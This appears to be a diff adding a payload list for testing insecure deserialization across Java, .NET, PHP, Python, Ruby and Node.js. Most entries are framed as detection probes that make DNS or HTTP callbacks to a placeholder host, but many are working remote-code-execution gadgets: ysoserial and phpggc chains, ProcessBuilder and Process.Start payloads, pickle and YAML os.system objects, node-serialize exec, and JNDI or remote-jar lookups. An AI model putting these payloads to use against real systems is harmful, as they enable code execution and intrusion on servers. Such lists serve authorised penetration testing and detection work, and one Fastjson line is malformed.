@@ -1,0 +1,171 @@
+# Deserialization: Additional Libraries and Detection Payloads
+# Prefer the inert callback probes (DNS or HTTP to a host you control) before any gadget that runs code. Replace oast.example.test.
+
+# Java URLDNS gadget (inert, DNS only; works with no extra libraries): generate with ysoserial
+java -jar ysoserial.jar URLDNS http://<unique-token>.oast.example.test > urldns.bin
+java -jar ysoserial.jar URLDNS http://<unique-token>.oast.example.test | base64 -w0
+# Java Serialized stream magic: AC ED 00 05 (hex) / rO0AB (base64) / H4sIAAAAAAAA + rO0 (gzip then base64)
+
+# Java: other inert or low-impact detection gadgets
+java -jar ysoserial.jar JRMPClient oast.example.test:1099
+java -jar ysoserial.jar CommonsCollections6 'nslookup <unique-token>.oast.example.test'
+java -jar ysoserial.jar CommonsBeanutils1 'nslookup <unique-token>.oast.example.test'
+java -jar ysoserial.jar Spring1 'nslookup <unique-token>.oast.example.test'
+java -jar ysoserial.jar Hibernate1 'nslookup <unique-token>.oast.example.test'
+java -jar ysoserial.jar ROME 'nslookup <unique-token>.oast.example.test'
+java -jar ysoserial.jar Click1 'nslookup <unique-token>.oast.example.test'
+java -jar ysoserial.jar Jdk7u21 'nslookup <unique-token>.oast.example.test'
+
+# Java: where serialized data hides (look for these in requests)
+Cookie: JSESSIONID=...; rememberMe=rO0AB...
+Cookie: rememberMe=<base64 AES-CBC/GCM encrypted serialized object>
+POST body octet-stream beginning with AC ED 00 05
+javax.faces.ViewState (JSF) value beginning with rO0AB
+X-Java-Serialized-Object: true
+Content-Type: application/x-java-serialized-object
+Content-Type: application/x-java-jnlp-file
+/invoker/JMXInvokerServlet
+/invoker/EJBInvokerServlet
+/jmx-console/
+t3:// and t3s:// (Oracle WebLogic T3 on 7001)
+iiop:// (CORBA)
+jnp:// (JBoss naming)
+
+# XStream (XML): detection probe (a reachable URL triggers a DNS interaction when the type is processed)
+<java.net.URL>http://<unique-token>.oast.example.test/</java.net.URL>
+<map><entry><url>http://<unique-token>.oast.example.test/</url><string>x</string></entry></map>
+<sorted-set><string>x</string></sorted-set>
+<java.util.Date>2020-01-01 00:00:00.0 UTC</java.util.Date>
+<dynamic-proxy><interface>java.lang.Comparable</interface><handler class="java.beans.EventHandler"><target class="java.lang.ProcessBuilder"><command><string>hostname</string></command></target><action>start</action></handler></dynamic-proxy>
+<tree-map><entry><string>a</string><string>b</string></entry></tree-map>
+<xstream-marker/>
+
+# SnakeYAML (Java YAML): detection and class-loading probes (CVE-2022-1471 style constructor use)
+!!java.net.URL ["http://<unique-token>.oast.example.test/yaml-marker"]
+!!java.net.URI ["http://<unique-token>.oast.example.test/yaml-marker"]
+!!java.util.HashMap {? !!java.net.URL ["http://<unique-token>.oast.example.test/yaml-marker"] : x}
+!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://oast.example.test/yaml-marker.jar"]]]]
+!!java.lang.ProcessBuilder [["hostname"]]
+!!com.example.app.UnknownClass {}
+!!java.io.File ["/tmp/yaml-marker"]
+!!java.util.ArrayList [1,2,3]
+a: !!java.util.Date [0]
+
+# Jackson polymorphic typing (enableDefaultTyping / @JsonTypeInfo): detection probes
+["java.net.URL","http://<unique-token>.oast.example.test/jackson-marker"]
+["java.util.HashMap",{"a":"b"}]
+{"@class":"java.net.URL","@type":"x"}
+["com.example.app.UnknownClass",{}]
+["org.springframework.context.support.ClassPathXmlApplicationContext","http://oast.example.test/jackson-marker.xml"]
+["com.sun.rowset.JdbcRowSetImpl",{"dataSourceName":"ldap://oast.example.test:1389/marker","autoCommit":true}]
+["org.apache.xbean.propertyeditor.JndiConverter",{"asText":"ldap://oast.example.test:1389/marker"}]
+["ch.qos.logback.core.db.DriverManagerConnectionSource",{"url":"jdbc:h2:mem:marker"}]
+{"@type":"java.lang.Exception"}
+
+# Fastjson (Alibaba): autoType detection probes
+{"@type":"java.net.Inet4Address","val":"<unique-token>.oast.example.test"}
+{"@type":"java.net.Inet6Address","val":"<unique-token>.oast.example.test"}
+{"@type":"java.net.InetSocketAddress"{"address":,"val":"<unique-token>.oast.example.test"}}
+{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://oast.example.test:1389/marker","autoCommit":true}}
+{"@type":"java.lang.AutoCloseable"
+[{"@type":"java.lang.Exception","@type":"com.example.app.Unknown"}]
+{"@type":"com.alibaba.fastjson.JSONObject","x":{"@type":"java.net.URL","val":"http://<unique-token>.oast.example.test/"}}
+
+# Hessian / Burlap / Kryo / XMLDecoder / JBoss Marshalling (Java binary and XML formats): where they appear
+Content-Type: x-application/hessian
+Content-Type: application/x-hessian
+Content-Type: application/x-kryo
+<java version="1.8.0" class="java.beans.XMLDecoder"><object class="java.net.URL"><string>http://<unique-token>.oast.example.test/xmldecoder-marker</string></object></java>
+<java><object class="java.lang.ProcessBuilder"><array class="java.lang.String" length="1"><void index="0"><string>hostname</string></void></array><void method="start"/></object></java>
+
+# .NET Json.NET (Newtonsoft) TypeNameHandling: detection probes
+{"$type":"System.Net.WebClient, System","x":1}
+{"$type":"System.Uri, System","UriString":"http://<unique-token>.oast.example.test/jsonnet-marker"}
+{"$type":"System.Collections.Generic.List`1[[System.Uri, System]], mscorlib","$values":[{"$type":"System.Uri, System","UriString":"http://<unique-token>.oast.example.test/"}]}
+{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","MethodParameters":{"$type":"System.Collections.ArrayList, mscorlib","$values":["cmd","/c hostname"]},"ObjectInstance":{"$type":"System.Diagnostics.Process, System"}}
+{"$type":"System.Configuration.Install.AssemblyInstaller, System.Configuration.Install","Path":"file:///tmp/marker.dll"}
+{"$type":"UnknownType, UnknownAssembly"}
+{"$type":"Marker.NonExistent, Marker"}
+
+# .NET: formats and where they hide
+Cookie: __VIEWSTATE=/wEP...  (with __VIEWSTATEGENERATOR; check MAC and machineKey)
+__VIEWSTATE=/wEPDwUKLTE...
+Content-Type: application/x-www-form-urlencoded with __EVENTVALIDATION
+AAEAAAD///// (BinaryFormatter base64 prefix)
+/wEy (ObjectStateFormatter base64 prefix)
+<ObjectDataProvider MethodName="Start"> (XAML)
+Content-Type: application/soap+xml with a SoapFormatter body
+ysoserial.exe -f Json.Net -g ObjectDataProvider -c "hostname" -o raw
+ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "hostname"
+ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "hostname" --path="/page.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="<key>" --validationalg="SHA1" --validationkey="<key>"
+
+# PHP: unserialize, POP chains and Phar (see also PHP serialization in deserialization-payloads.txt)
+a:1:{i:0;O:8:"stdClass":0:{}}
+O:7:"Marker":1:{s:4:"data";s:6:"marker";}
+a:2:{i:0;s:1:"a";i:1;R:2;}
+O:21:"JDatabaseDriverMysqli":0:{}
+phpggc -l
+phpggc Monolog/RCE1 system 'hostname'
+phpggc Laravel/RCE9 system 'hostname'
+phpggc Symfony/RCE4 system 'hostname'
+phpggc Guzzle/FW1 /tmp/marker /tmp/local-file
+phpggc -p phar -o /tmp/marker.phar Monolog/RCE1 system 'hostname'
+phar://uploads/avatar.jpg/marker
+phar://./uploads/avatar.jpg
+# PHP before 8.0: filesystem functions (file_exists, is_dir, filesize, getimagesize and others) unserialize Phar metadata when given a phar:// path
+file_exists('phar://uploads/avatar.jpg')
+getimagesize('phar://uploads/avatar.jpg')
+# PHP 8.0 and later: metadata is unserialized only when read explicitly, so the two probes above give a negative result; test for these sinks instead
+(new Phar('phar://uploads/avatar.jpg'))->getMetadata()
+(new PharData('phar://uploads/archive.tar'))->getMetadata()
+
+# Python: pickle, PyYAML, jsonpickle, shelve, marshal and numpy/pandas loaders
+gASVKgAAAAAAAACMCGJ1aWx0aW5zlIwFcHJpbnSUk5SMDXBpY2tsZS1tYXJrZXKUhZRSlC4=
+cposix\nsystem\n(S'hostname'\ntR.
+!!python/object/apply:os.system ["hostname"]
+!!python/object/new:os.system ["hostname"]
+!!python/object/apply:subprocess.check_output [["hostname"]]
+!!python/name:os.system
+{"py/object":"os.system","py/reduce":[{"py/type":"os.system"},{"py/tuple":["hostname"]}]}
+{"py/reduce":[{"py/function":"os.system"},{"py/tuple":["hostname"]}]}
+numpy.load('file.npy', allow_pickle=True)
+pandas.read_pickle('file.pkl')
+torch.load('model.pt')
+joblib.load('model.joblib')
+yaml.load(data)
+yaml.load(data, Loader=yaml.Loader)
+yaml.unsafe_load(data)
+pickle.loads(data)
+shelve.open('file')
+marshal.loads(data)
+dill.loads(data)
+
+# Ruby: Marshal, YAML (Psych) and Oj
+"\x04\bo:\x0bMarker\x00"
+--- !ruby/object:Gem::Installer {}
+--- !ruby/object:Gem::SpecFetcher {}
+--- !ruby/object:Gem::Requirement {requirements: [!ruby/object:Gem::Version {version: "1"}]}
+--- !ruby/object:OpenStruct {table: {marker: x}}
+--- !ruby/hash:ActionController::Parameters {}
+YAML.load(data)
+Marshal.load(data)
+Oj.load(data, mode: :object)
+{"^o":"Marker","x":1}
+Psych.unsafe_load(data)
+
+# Node.js: node-serialize and funcster-style IIFE in JSON (older, vulnerable libraries only)
+{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('hostname',function(e,s){})}()"}
+{"rce":"_$$ND_FUNC$$_function(){return 'marker'}()"}
+{"__js_function":"function(){return 'marker'}"}
+serialize.unserialize(data)
+
+# Detection of the format from a response or cookie (decode and check the first bytes)
+echo '<value>' | base64 -d | xxd | head
+echo '<value>' | base64 -d | file -
+echo '<value>' | base64 -d | gunzip | xxd | head
+# AC ED 00 05  Java serialized
+# 80 03 / 80 04 / 80 05  Python pickle protocol 3/4/5
+# 04 08  Ruby Marshal
+# 4F 3A  PHP (O:)
+# 00 01 00 00 00 FF FF FF FF  .NET BinaryFormatter
+# 1F 8B  gzip wrapper
